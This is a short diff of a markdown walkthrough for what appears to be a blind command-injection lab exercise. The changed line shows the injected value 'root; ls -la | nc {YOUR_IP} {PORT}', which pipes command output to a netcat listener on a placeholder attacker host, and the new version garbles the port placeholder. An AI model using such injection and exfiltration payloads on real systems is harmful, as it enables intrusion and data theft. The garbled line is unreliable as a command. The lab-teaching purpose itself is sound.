@@ -19,7 +19,7 @@ Ping is usually enough to tell you whether you have blind command injection, but
 
 ## Bypassing the Blind Injection with Netcat
 
-In the spirit of full disclosure, there is a way to bypass the blind injection with netcat.  You are able to pipe the output of a command to a nc listener.  You could do something like ```root; ls -la | nc {YOUR_IP} {PORT}``` . This will send the output of ls -la to your netcat listener.
+In the spirit of full disclosure, there is a way to bypass the blind injection with netcat.  You are able to pipe the output of a command to a nc listener.  You could do something like ```root; ls -la | nc {YOUR_IP} {PORT12**123:))}``` . This will send the output of ls -la to your netcat listener.
 
 ## Action
 1. Ping the box with 10 packets.  What is this command (without IP address)?
